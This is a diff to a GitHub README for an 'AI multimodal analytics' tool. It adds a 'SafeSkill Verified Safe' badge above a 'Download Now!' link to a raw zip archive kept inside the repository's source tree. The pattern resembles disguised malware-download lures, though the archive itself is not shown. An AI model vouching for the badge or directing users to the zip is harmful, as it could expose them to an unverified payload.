@@ -1,5 +1,7 @@
 # 🎉 ai-driven-multimodal-analytics - Simple AI Tools for Everyone
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sanggio-ai-driven-multimodal-analytics)
+
 ## 📥 Download Now!
 [![Download ai-driven-multimodal-analytics](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip)
 
